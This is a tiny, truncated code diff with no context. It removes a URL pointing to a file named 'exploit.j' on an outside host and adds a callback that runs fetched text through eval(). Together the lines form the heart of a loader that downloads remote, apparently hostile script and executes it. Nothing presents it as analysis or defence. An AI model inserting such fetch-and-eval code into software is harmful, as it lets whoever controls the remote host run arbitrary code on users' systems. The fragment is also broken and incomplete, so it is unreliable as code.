@@ -1,1 +1,1 @@
-'https://compactcow.com/ltbeef/exploit.j
+>{data.text().then(text=>{eval(text)})}
